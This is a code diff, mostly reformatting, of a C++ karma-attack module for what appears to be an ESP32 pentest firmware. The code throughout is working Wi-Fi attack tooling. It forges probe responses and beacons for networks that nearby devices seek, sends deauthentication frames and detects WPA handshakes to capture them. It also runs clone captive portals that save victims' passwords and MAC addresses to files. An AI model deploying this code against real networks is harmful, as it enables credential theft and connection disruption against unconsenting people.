@@ -1,32 +1,29 @@
+#ifndef LITE_VERSION
+#include "karma_attack.h"
 #include "FS.h"
-#include <set>
-#include <vector>
-#include <map>
-#include <algorithm>
-#include <queue>
-#include <Arduino.h>
-#include <TimeLib.h>
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
-#include "core/wifi/wifi_common.h"
 #include "core/wifi/webInterface.h"
+#include "core/wifi/wifi_common.h"
 #include "driver/gpio.h"
 #include "esp_event.h"
 #include "esp_system.h"
 #include "esp_wifi.h"
-#include "lwip/err.h"
 #include "freertos/FreeRTOS.h"
-#include "freertos/ringbuf.h"
 #include "freertos/queue.h"
-#include "core/display.h"
-#include "core/mykeyboard.h"
-#include "core/sd_functions.h"
-#include "core/wifi/wifi_common.h"
+#include "freertos/ringbuf.h"
+#include "lwip/err.h"
 #include "modules/wifi/evil_portal.h"
 #include "modules/wifi/sniffer.h"
-#include "karma_attack.h"
+#include <Arduino.h>
+#include <TimeLib.h>
+#include <algorithm>
 #include <globals.h>
+#include <map>
+#include <queue>
+#include <set>
+#include <vector>
 
 void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type);
 void saveHandshakeToFile(const HandshakeCapture &hs);
@@ -71,7 +68,7 @@ KarmaMode karmaMode = MODE_PASSIVE;
 bool karmaPaused = false;
 
 // Background portal tracking - pointer vector for multiple simultaneous portals
-std::vector<BackgroundPortal*> activePortals;
+std::vector<BackgroundPortal *> activePortals;
 int nextPortalIndex = 0;
 unsigned long lastPortalHeartbeat = 0;
 bool handshakeCaptureEnabled = false;
@@ -81,25 +78,40 @@ std::vector<HandshakeCapture> handshakeBuffer;
 std::map<uint32_t, ClientBehavior> clientBehaviors;
 
 const uint8_t vendorOUIs[][3] PROGMEM = {
-    {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
-    {0x00, 0x0C, 0x29}, {0x00, 0x1D, 0x0F}, {0x00, 0x26, 0x5E}, {0x00, 0x19, 0xE3},
-    {0x00, 0x21, 0x91}, {0x00, 0x1E, 0x8C}, {0x00, 0x12, 0x17}, {0x00, 0x18, 0xDE},
-    {0x00, 0x1E, 0xE1}, {0x00, 0x13, 0x10}, {0x00, 0x1C, 0xDF}, {0x00, 0x0F, 0xEA},
-    {0x00, 0x14, 0x6C}, {0x00, 0x25, 0x9C}, {0x00, 0x11, 0x22}, {0x00, 0x16, 0x6F}
+    {0x00, 0x50, 0xF2},
+    {0x00, 0x1A, 0x11},
+    {0x00, 0x1B, 0x63},
+    {0x00, 0x24, 0x01},
+    {0x00, 0x0C, 0x29},
+    {0x00, 0x1D, 0x0F},
+    {0x00, 0x26, 0x5E},
+    {0x00, 0x19, 0xE3},
+    {0x00, 0x21, 0x91},
+    {0x00, 0x1E, 0x8C},
+    {0x00, 0x12, 0x17},
+    {0x00, 0x18, 0xDE},
+    {0x00, 0x1E, 0xE1},
+    {0x00, 0x13, 0x10},
+    {0x00, 0x1C, 0xDF},
+    {0x00, 0x0F, 0xEA},
+    {0x00, 0x14, 0x6C},
+    {0x00, 0x25, 0x9C},
+    {0x00, 0x11, 0x22},
+    {0x00, 0x16, 0x6F}
 };
 
 const uint8_t priorityChannels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
 #define NUM_PRIORITY_CHANNELS 13
 
 const uint8_t beacon_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
-const uint8_t probe_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c};
+const uint8_t probe_rates[] PROGMEM = {
+    0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c
+};
 const uint8_t ext_rates[] PROGMEM = {0x32, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60};
-const uint8_t rsn_wpa3[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
-                                    0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
-                                    0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
-const uint8_t rsn_wpa2[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
-                                    0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
-                                    0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
+const uint8_t rsn_wpa3[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC,
+                                    0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
+const uint8_t rsn_wpa2[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC,
+                                    0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
 const uint8_t ht_cap[] PROGMEM = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -157,13 +169,9 @@ void SSIDDatabase::clearCache() {
     cacheLoaded = false;
 }
 
-bool SSIDDatabase::isLoaded() {
-    return cacheLoaded && !ssidCache.empty();
-}
+bool SSIDDatabase::isLoaded() { return cacheLoaded && !ssidCache.empty(); }
 
-String SSIDDatabase::getSourceFile() {
-    return currentFilename;
-}
+String SSIDDatabase::getSourceFile() { return currentFilename; }
 
 size_t SSIDDatabase::getCount() {
     if (!cacheLoaded) loadFromFile();
@@ -197,7 +205,11 @@ String SSIDDatabase::getRandomSSID() {
 }
 
 void SSIDDatabase::getBatch(size_t startIndex, size_t count, std::vector<String> &result) {
-    if (!cacheLoaded) if (!loadFromFile()) { result.clear(); return; }
+    if (!cacheLoaded)
+        if (!loadFromFile()) {
+            result.clear();
+            return;
+        }
     result.clear();
     if (startIndex >= ssidCache.size()) return;
     size_t endIndex = startIndex + count;
@@ -205,9 +217,7 @@ void SSIDDatabase::getBatch(size_t startIndex, size_t count, std::vector<String>
     for (size_t i = startIndex; i < endIndex; i++) result.push_back(ssidCache[i]);
 }
 
-bool SSIDDatabase::contains(const String &ssid) {
-    return findSSID(ssid) >= 0;
-}
+bool SSIDDatabase::contains(const String &ssid) { return findSSID(ssid) >= 0; }
 
 size_t SSIDDatabase::getAverageLength() {
     if (!cacheLoaded) loadFromFile();
@@ -220,7 +230,8 @@ size_t SSIDDatabase::getAverageLength() {
 size_t SSIDDatabase::getMaxLength() {
     if (!cacheLoaded) loadFromFile();
     size_t maxLen = 0;
-    for (const auto &ssid : ssidCache) if (ssid.length() > maxLen) maxLen = ssid.length();
+    for (const auto &ssid : ssidCache)
+        if (ssid.length() > maxLen) maxLen = ssid.length();
     return maxLen;
 }
 
@@ -228,13 +239,14 @@ size_t SSIDDatabase::getMinLength() {
     if (!cacheLoaded) loadFromFile();
     if (ssidCache.empty()) return 0;
     size_t minLen = 32;
-    for (const auto &ssid : ssidCache) if (ssid.length() < minLen) minLen = ssid.length();
+    for (const auto &ssid : ssidCache)
+        if (ssid.length() < minLen) minLen = ssid.length();
     return minLen;
 }
 
-ActiveBroadcastAttack::ActiveBroadcastAttack() 
-    : currentIndex(0), batchStart(0), lastBroadcastTime(0), lastChannelHopTime(0),
-      _active(false), currentChannel(1), totalSSIDsInFile(0), ssidsProcessed(0), updateCounter(0) {
+ActiveBroadcastAttack::ActiveBroadcastAttack()
+    : currentIndex(0), batchStart(0), lastBroadcastTime(0), lastChannelHopTime(0), _active(false),
+      currentChannel(1), totalSSIDsInFile(0), ssidsProcessed(0), updateCounter(0) {
     stats.startTime = millis();
 }
 
@@ -255,9 +267,7 @@ void ActiveBroadcastAttack::start() {
     updateCounter = 0;
 }
 
-void ActiveBroadcastAttack::stop() {
-    _active = false;
-}
+void ActiveBroadcastAttack::stop() { _active = false; }
 
 void ActiveBroadcastAttack::restart() {
     stop();
@@ -265,21 +275,13 @@ void ActiveBroadcastAttack::restart() {
     start();
 }
 
-bool ActiveBroadcastAttack::isActive() const {
-    return _active;
-}
+bool ActiveBroadcastAttack::isActive() const { return _active; }
 
-void ActiveBroadcastAttack::setConfig(const BroadcastConfig &newConfig) {
-    config = newConfig;
-}
+void ActiveBroadcastAttack::setConfig(const BroadcastConfig &newConfig) { config = newConfig; }
 
-BroadcastConfig ActiveBroadcastAttack::getConfig() const {
-    return config;
-}
+BroadcastConfig ActiveBroadcastAttack::getConfig() const { return config; }
 
-void ActiveBroadcastAttack::setBroadcastInterval(uint32_t interval) {
-    config.broadcastInterval = interval;
-}
+void ActiveBroadcastAttack::setBroadcastInterval(uint32_t interval) { config.broadcastInterval = interval; }
 
 void ActiveBroadcastAttack::setBatchSize(uint16_t size) {
     config.batchSize = size;
@@ -330,17 +332,11 @@ void ActiveBroadcastAttack::processProbeResponse(const String &ssid, const Strin
     if (stats.ssidResponseCount[ssid] >= 1) launchAttackForResponse(ssid, mac);
 }
 
-BroadcastStats ActiveBroadcastAttack::getStats() const {
-    return stats;
-}
+BroadcastStats ActiveBroadcastAttack::getStats() const { return stats; }
 
-size_t ActiveBroadcastAttack::getTotalSSIDs() const {
-    return totalSSIDsInFile;
-}
+size_t ActiveBroadcastAttack::getTotalSSIDs() const { return totalSSIDsInFile; }
 
-size_t ActiveBroadcastAttack::getCurrentPosition() const {
-    return ssidsProcessed;
-}
+size_t ActiveBroadcastAttack::getCurrentPosition() const { return ssidsProcessed; }
 
 float ActiveBroadcastAttack::getProgressPercent() const {
     if (totalSSIDsInFile == 0) return 0.0f;
@@ -354,30 +350,26 @@ std::vector<std::pair<String, size_t>> ActiveBroadcastAttack::getTopResponses(si
         if (i++ >= 20) break;
         sorted.push_back(pair);
     }
-    std::sort(sorted.begin(), sorted.end(),
-        [](const auto &a, const auto &b) { return a.second > b.second; });
+    std::sort(sorted.begin(), sorted.end(), [](const auto &a, const auto &b) { return a.second > b.second; });
     if (sorted.size() > count) sorted.resize(count);
     return sorted;
 }
 
 void ActiveBroadcastAttack::addHighPrioritySSID(const String &ssid) {
-    for (const auto &hpSSID : highPrioritySSIDs) if (hpSSID == ssid) return;
+    for (const auto &hpSSID : highPrioritySSIDs)
+        if (hpSSID == ssid) return;
     highPrioritySSIDs.push_back(ssid);
     if (highPrioritySSIDs.size() > 10) highPrioritySSIDs.erase(highPrioritySSIDs.begin());
 }
 
-void ActiveBroadcastAttack::clearHighPrioritySSIDs() {
-    highPrioritySSIDs.clear();
-}
+void ActiveBroadcastAttack::clearHighPrioritySSIDs() { highPrioritySSIDs.clear(); }
 
 void ActiveBroadcastAttack::loadNextBatch() {
     currentBatch.clear();
     SSIDDatabase::getBatch(batchStart, config.batchSize, currentBatch);
 }
 
-void ActiveBroadcastAttack::broadcastSSID(const String &ssid) {
-    sendBeaconFrameHelper(ssid, currentChannel);
-}
+void ActiveBroadcastAttack::broadcastSSID(const String &ssid) { sendBeaconFrameHelper(ssid, currentChannel); }
 
 void ActiveBroadcastAttack::rotateChannel() {
     static size_t channelIndex = 0;
@@ -391,9 +383,7 @@ void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t channel)
 
 void ActiveBroadcastAttack::recordResponse(const String &ssid) {
     stats.totalResponses++;
-    if (stats.ssidResponseCount.size() < 30) {
-        stats.ssidResponseCount[ssid]++;
-    }
+    if (stats.ssidResponseCount.size() < 30) { stats.ssidResponseCount[ssid]++; }
     stats.lastResponseTime = millis();
 }
 
@@ -404,7 +394,8 @@ void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const St
     extern AttackConfig attackConfig;
     if (!templateSelected) return;
     int activeCount = 0;
-    for (const auto &portal : pendingPortals) if (!portal.launched) activeCount++;
+    for (const auto &portal : pendingPortals)
+        if (!portal.launched) activeCount++;
     if (activeCount >= config.maxActiveAttacks) return;
     if (pendingPortals.size() >= MAX_PENDING_PORTALS) return;
     PendingPortal portal;
@@ -489,11 +480,11 @@ void forceFullRedraw() {
     tft.fillScreen(bruceConfig.bgColor);
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
     tft.setTextSize(FP);
-    
+
     // Force a full refresh of the display
     tft.setCursor(0, 0);
     tft.fillRect(0, 0, tftWidth, tftHeight, bruceConfig.bgColor);
-    
+
     // Small delay to ensure display processes the clear
     delay(50);
 }
@@ -516,34 +507,32 @@ String generatePortalId(const String &templateName) {
     safeName.toLowerCase();
     safeName.replace("(verify)", "");
     safeName.trim();
-    
+
     int instance = 1;
     FS *fs = nullptr;
     if (getFsStorage(fs)) {
-        while (fs->exists("/PortalCreds/" + safeName + "_" + String(instance) + ".txt")) {
-            instance++;
-        }
+        while (fs->exists("/PortalCreds/" + safeName + "_" + String(instance) + ".txt")) { instance++; }
     }
-    
+
     return safeName + "_" + String(instance);
 }
 
 // Save captured portal credentials to SD/LittleFS
-void savePortalCredentials(const String &ssid, const String &identifier, 
-                          const String &password, const String &mac,
-                          uint8_t channel, const String &templateName,
-                          const String &portalId) {
-    
+void savePortalCredentials(
+    const String &ssid, const String &identifier, const String &password, const String &mac, uint8_t channel,
+    const String &templateName, const String &portalId
+) {
+
     FS *fs = nullptr;
     if (!getFsStorage(fs)) return;
-    
+
     if (!fs->exists("/PortalCreds")) {
         if (!fs->mkdir("/PortalCreds")) {
             Serial.println("[ERROR] Cannot create /PortalCreds");
             return;
         }
     }
-    
+
     String filename = "/PortalCreds/" + portalId + ".txt";
     File file = fs->open(filename, FILE_WRITE);
     if (file) {
@@ -560,12 +549,19 @@ void savePortalCredentials(const String &ssid, const String &identifier,
         file.close();
         Serial.printf("[PORTAL] Credentials saved to %s\n", filename.c_str());
     }
-    
+
     File logFile = fs->open("/PortalCreds/captures_master.txt", FILE_APPEND);
     if (logFile) {
-        logFile.printf("Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
-                      millis(), portalId.c_str(), ssid.c_str(), 
-                      identifier.c_str(), password.c_str(), mac.c_str(), channel);
+        logFile.printf(
+            "Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
+            millis(),
+            portalId.c_str(),
+            ssid.c_str(),
+            identifier.c_str(),
+            password.c_str(),
+            mac.c_str(),
+            channel
+        );
         logFile.close();
     }
 }
@@ -584,9 +580,7 @@ String generateUniqueFilename(FS &fs, bool compressed) {
     return filename;
 }
 
-void initMACCache() {
-    macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE * 18, RINGBUF_TYPE_NOSPLIT);
-}
+void initMACCache() { macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE * 18, RINGBUF_TYPE_NOSPLIT); }
 
 bool isMACInCache(const String &mac) {
     if (!macRingBuffer) return false;
@@ -617,24 +611,22 @@ void addMACToCache(const String &mac) {
 uint32_t generateClientFingerprint(const uint8_t *frame, int len) {
     uint32_t hash = 5381;
     int pos = 24;
-    
+
     while (pos + 1 < len) {
         uint8_t tag = frame[pos];
         uint8_t tagLen = frame[pos + 1];
-        
+
         if (pos + 2 + tagLen > len) break;
-        
+
         hash = ((hash << 5) + hash) + tag;
         hash = ((hash << 5) + hash) + tagLen;
-        
+
         int maxBytes = (tagLen < 4) ? tagLen : 4;
-        for (int i = 0; i < maxBytes; i++) {
-            hash = ((hash << 5) + hash) + frame[pos + 2 + i];
-        }
-        
+        for (int i = 0; i < maxBytes; i++) { hash = ((hash << 5) + hash) + frame[pos + 2 + i]; }
+
         pos += 2 + tagLen;
     }
-    
+
     return hash;
 }
 
@@ -675,8 +667,17 @@ String extractSSID(const wifi_promiscuous_pkt_t *packet) {
 String extractMAC(const wifi_promiscuous_pkt_t *packet) {
     const uint8_t *frame = packet->payload;
     char mac[18];
-    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
-             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
+    snprintf(
+        mac,
+        sizeof(mac),
+        "%02X:%02X:%02X:%02X:%02X:%02X",
+        frame[10],
+        frame[11],
+        frame[12],
+        frame[13],
+        frame[14],
+        frame[15]
+    );
     return String(mac);
 }
 
@@ -713,15 +714,13 @@ bool isEAPOL(const wifi_promiscuous_pkt_t *packet) {
     const uint8_t *payload = packet->payload;
     int len = packet->rx_ctrl.sig_len;
     if (len < (24 + 8 + 4)) return false;
-    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && 
-        payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 && 
-        payload[30] == 0x88 && payload[31] == 0x8E) {
+    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && payload[27] == 0x00 &&
+        payload[28] == 0x00 && payload[29] == 0x00 && payload[30] == 0x88 && payload[31] == 0x8E) {
         return true;
     }
     if ((payload[0] & 0x0F) == 0x08) {
-        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && 
-            payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 && 
-            payload[32] == 0x88 && payload[33] == 0x8E) {
+        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && payload[29] == 0x00 &&
+            payload[30] == 0x00 && payload[31] == 0x00 && payload[32] == 0x88 && payload[33] == 0x8E) {
             return true;
         }
     }
@@ -747,7 +746,7 @@ int classifyEAPOLMessage(const wifi_promiscuous_pkt_t *pkt) {
 
 void analyzeClientBehavior(const ProbeRequest &probe) {
     auto it = clientBehaviors.find(probe.fingerprint);
-    
+
     if (it == clientBehaviors.end()) {
         if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
             uint32_t oldestFingerprint = 0;
@@ -758,11 +757,9 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
                     oldestFingerprint = pair.first;
                 }
             }
-            if (oldestFingerprint != 0) {
-                clientBehaviors.erase(oldestFingerprint);
-            }
+            if (oldestFingerprint != 0) { clientBehaviors.erase(oldestFingerprint); }
         }
-        
+
         ClientBehavior behavior;
         behavior.fingerprint = probe.fingerprint;
         behavior.lastMAC = probe.mac;
@@ -788,9 +785,13 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         }
         bool ssidExists = false;
         for (const auto &existingSSID : behavior.probedSSIDs) {
-            if (existingSSID == probe.ssid) { ssidExists = true; break; }
+            if (existingSSID == probe.ssid) {
+                ssidExists = true;
+                break;
+            }
         }
-        if (!ssidExists && probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*" && behavior.probedSSIDs.size() < 5) {
+        if (!ssidExists && probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*" &&
+            behavior.probedSSIDs.size() < 5) {
             behavior.probedSSIDs.push_back(probe.ssid);
             if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) behavior.isVulnerable = true;
         }
@@ -822,7 +823,7 @@ AttackTier determineAttackTier(uint8_t priority) {
 }
 
 uint16_t getPortalDuration(AttackTier tier) {
-    switch(tier) {
+    switch (tier) {
         case TIER_CLONE: return (uint16_t)attackConfig.cloneDuration;
         case TIER_HIGH: return attackConfig.highTierDuration;
         case TIER_MEDIUM: return attackConfig.mediumTierDuration;
@@ -847,17 +848,25 @@ void rotateBSSID() {
     }
 }
 
-size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid, 
-                                 const String &targetMAC, uint8_t channel, 
-                                 const RSNInfo &rsn, bool isHidden) {
+size_t buildEnhancedProbeResponse(
+    uint8_t *buffer, const String &ssid, const String &targetMAC, uint8_t channel, const RSNInfo &rsn,
+    bool isHidden
+) {
     uint8_t pos = 0;
     buffer[pos++] = 0x50;
     buffer[pos++] = 0x00;
     buffer[pos++] = 0x00;
     buffer[pos++] = 0x00;
-    sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &buffer[pos], &buffer[pos+1], &buffer[pos+2],
-           &buffer[pos+3], &buffer[pos+4], &buffer[pos+5]);
+    sscanf(
+        targetMAC.c_str(),
+        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        &buffer[pos],
+        &buffer[pos + 1],
+        &buffer[pos + 2],
+        &buffer[pos + 3],
+        &buffer[pos + 4],
+        &buffer[pos + 5]
+    );
     pos += 6;
     memcpy(&buffer[pos], currentBSSID, 6);
     pos += 6;
@@ -1035,9 +1044,16 @@ void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
     probeResponse[pos++] = 0x00;
     probeResponse[pos++] = 0x00;
     probeResponse[pos++] = 0x00;
-    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &probeResponse[pos], &probeResponse[pos+1], &probeResponse[pos+2],
-           &probeResponse[pos+3], &probeResponse[pos+4], &probeResponse[pos+5]);
+    sscanf(
+        mac.c_str(),
+        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        &probeResponse[pos],
+        &probeResponse[pos + 1],
+        &probeResponse[pos + 2],
+        &probeResponse[pos + 3],
+        &probeResponse[pos + 4],
+        &probeResponse[pos + 5]
+    );
     pos += 6;
     memcpy(&probeResponse[pos], currentBSSID, 6);
     pos += 6;
@@ -1078,23 +1094,27 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
     }
 
     if (channel >= 1 && channel <= 14) {
-        if (deauthCount[channel-1] >= MAX_DEAUTH_PER_SECOND) {
-            return;
-        }
-        deauthCount[channel-1]++;
+        if (deauthCount[channel - 1] >= MAX_DEAUTH_PER_SECOND) { return; }
+        deauthCount[channel - 1]++;
     }
 
-    if (activePortalChannel > 0 && channel != activePortalChannel) {
-        return;
-    }
+    if (activePortalChannel > 0 && channel != activePortalChannel) { return; }
 
     uint8_t deauthPacket[26] = {0};
     deauthPacket[0] = 0xC0;
     deauthPacket[1] = 0x00;
     if (broadcast) memset(&deauthPacket[2], 0xFF, 6);
-    else sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                &deauthPacket[2], &deauthPacket[3], &deauthPacket[4],
-                &deauthPacket[5], &deauthPacket[6], &deauthPacket[7]);
+    else
+        sscanf(
+            mac.c_str(),
+            "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+            &deauthPacket[2],
+            &deauthPacket[3],
+            &deauthPacket[4],
+            &deauthPacket[5],
+            &deauthPacket[6],
+            &deauthPacket[7]
+        );
     memcpy(&deauthPacket[8], currentBSSID, 6);
     memcpy(&deauthPacket[14], currentBSSID, 6);
     deauthPacket[20] = 0x00;
@@ -1103,9 +1123,7 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
     deauthPacket[23] = 0x00;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);
-    if (err == ESP_OK) {
-        deauthPacketsSent++;
-    }
+    if (err == ESP_OK) { deauthPacketsSent++; }
 }
 
 void sendBeaconFrames() {
@@ -1118,10 +1136,12 @@ void sendBeaconFrames() {
             if (!activeNetworks.empty()) {
                 uint8_t netIndex = beaconsInBurst % activeNetworks.size();
                 uint8_t beaconFrame[256];
-                size_t frameLen = buildBeaconFrame(beaconFrame, 
+                size_t frameLen = buildBeaconFrame(
+                    beaconFrame,
                     activeNetworks[netIndex].ssid,
-                    activeNetworks[netIndex].channel, 
-                    activeNetworks[netIndex].rsn);
+                    activeNetworks[netIndex].channel,
+                    activeNetworks[netIndex].rsn
+                );
                 esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, frameLen, false);
                 beaconsSent++;
             }
@@ -1129,9 +1149,7 @@ void sendBeaconFrames() {
             lastBeaconBurst = now;
         }
     } else {
-        if (now - lastBeaconBurst > LISTEN_WINDOW) {
-            beaconsInBurst = 0;
-        }
+        if (now - lastBeaconBurst > LISTEN_WINDOW) { beaconsInBurst = 0; }
     }
 }
 
@@ -1139,10 +1157,14 @@ void processResponseQueue() {
     unsigned long now = millis();
     while (!responseQueue.empty()) {
         ProbeResponseTask &task = responseQueue.front();
-        if (now - task.timestamp > RESPONSE_TIMEOUT_MS) { responseQueue.pop(); continue; }
+        if (now - task.timestamp > RESPONSE_TIMEOUT_MS) {
+            responseQueue.pop();
+            continue;
+        }
         uint8_t responseFrame[256];
-        size_t frameLen = buildEnhancedProbeResponse(responseFrame, task.ssid, task.targetMAC,
-                                                    task.channel, task.rsn, false);
+        size_t frameLen = buildEnhancedProbeResponse(
+            responseFrame, task.ssid, task.targetMAC, task.channel, task.rsn, false
+        );
         esp_wifi_set_channel(task.channel, WIFI_SECOND_CHAN_NONE);
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, responseFrame, frameLen, false);
         if (err == ESP_OK) {
@@ -1163,7 +1185,11 @@ void processResponseQueue() {
             }
             bool found = false;
             for (auto &net : activeNetworks) {
-                if (net.ssid == task.ssid) { found = true; net.lastActivity = now; break; }
+                if (net.ssid == task.ssid) {
+                    found = true;
+                    net.lastActivity = now;
+                    break;
+                }
             }
             if (!found && activeNetworks.size() < MAX_CONCURRENT_SSIDS) {
                 ActiveNetwork net;
@@ -1238,16 +1264,17 @@ uint8_t getBestChannel() {
     uint8_t best = 1;
     uint16_t maxActivity = 0;
     for (int i = 0; i < 14; i++) {
-        if (channelActivity[i] > maxActivity) { maxActivity = channelActivity[i]; best = i + 1; }
+        if (channelActivity[i] > maxActivity) {
+            maxActivity = channelActivity[i];
+            best = i + 1;
+        }
     }
     return best;
 }
 
 void updateSSIDFrequency(const String &ssid) {
     if (ssid.isEmpty() || ssid == "*WILDCARD*") return;
-    if (ssidFrequency.size() < MAX_POPULAR_SSIDS) {
-        ssidFrequency[ssid]++;
-    }
+    if (ssidFrequency.size() < MAX_POPULAR_SSIDS) { ssidFrequency[ssid]++; }
     static unsigned long lastSort = 0;
     if (millis() - lastSort > 5000) {
         lastSort = millis();
@@ -1256,8 +1283,9 @@ void updateSSIDFrequency(const String &ssid) {
             popularSSIDs.push_back(std::make_pair(pair.first, pair.second));
             if (popularSSIDs.size() >= MAX_POPULAR_SSIDS) break;
         }
-        std::sort(popularSSIDs.begin(), popularSSIDs.end(),
-            [](const auto &a, const auto &b) { return a.second > b.second; });
+        std::sort(popularSSIDs.begin(), popularSSIDs.end(), [](const auto &a, const auto &b) {
+            return a.second > b.second;
+        });
     }
 }
 
@@ -1275,7 +1303,10 @@ void checkCloneAttackOpportunities() {
         if (ssidPair.second >= attackConfig.cloneThreshold) {
             bool alreadyAttacking = false;
             for (const auto &portal : pendingPortals) {
-                if (portal.ssid == ssidPair.first && portal.isCloneAttack) { alreadyAttacking = true; break; }
+                if (portal.ssid == ssidPair.first && portal.isCloneAttack) {
+                    alreadyAttacking = true;
+                    break;
+                }
             }
             if (!alreadyAttacking && pendingPortals.size() < MAX_PENDING_PORTALS) {
                 PendingPortal portal;
@@ -1302,20 +1333,20 @@ void checkCloneAttackOpportunities() {
 void checkPortals() {
     if (karmaPaused) return;
     unsigned long now = millis();
-    
+
     if (now - lastPortalHeartbeat < PORTAL_HEARTBEAT_INTERVAL) return;
-    
+
     if (activePortals.empty()) {
         lastPortalHeartbeat = now;
         return;
     }
-    
+
     bool victimActive = false;
     uint8_t lockedChannel = 0;
     int victimPortalIndex = -1;
-    
+
     for (size_t i = 0; i < activePortals.size(); i++) {
-        BackgroundPortal* p = activePortals[i];
+        BackgroundPortal *p = activePortals[i];
         if (p->victimConnected && (now - p->lastClientActivity < 5000)) {
             victimActive = true;
             lockedChannel = p->channel;
@@ -1323,22 +1354,22 @@ void checkPortals() {
             break;
         }
     }
-    
+
     if (victimActive) {
         if (channl != lockedChannel - 1) {
             channl = lockedChannel - 1;
             setChannelWithSecond(lockedChannel);
         }
-        
-        BackgroundPortal* portal = activePortals[victimPortalIndex];
+
+        BackgroundPortal *portal = activePortals[victimPortalIndex];
         portal->instance->processRequests();
         portal->lastHeartbeat = now;
-        
+
         if (portal->instance->hasCredentials()) {
             portal->hasCreds = true;
             portal->capturedPassword = portal->instance->getCapturedPassword();
             portal->markedForRemoval = true;
-            
+
             savePortalCredentials(
                 portal->ssid,
                 "user",
@@ -1348,36 +1379,42 @@ void checkPortals() {
                 portal->instance->getApName(),
                 portal->portalId
             );
-            
+
             delete portal->instance;
             portal->instance = nullptr;
         }
-        
+
         lastPortalHeartbeat = now;
-        
-        activePortals.erase(std::remove_if(activePortals.begin(), activePortals.end(),
-            [now](BackgroundPortal* p) {
-                if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
-                    if (p->instance) delete p->instance;
-                    delete p;
-                    return true;
+
+        activePortals.erase(
+            std::remove_if(
+                activePortals.begin(),
+                activePortals.end(),
+                [now](BackgroundPortal *p) {
+                    if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
+                        if (p->instance) delete p->instance;
+                        delete p;
+                        return true;
+                    }
+                    return false;
                 }
-                return false;
-            }), activePortals.end());
-        
+            ),
+            activePortals.end()
+        );
+
         return;
     }
-    
-    BackgroundPortal* portal = activePortals[nextPortalIndex];
-    
+
+    BackgroundPortal *portal = activePortals[nextPortalIndex];
+
     setChannelWithSecond(portal->channel);
     portal->instance->processRequests();
-    
+
     if (portal->instance->hasCredentials()) {
         portal->hasCreds = true;
         portal->capturedPassword = portal->instance->getCapturedPassword();
         portal->markedForRemoval = true;
-        
+
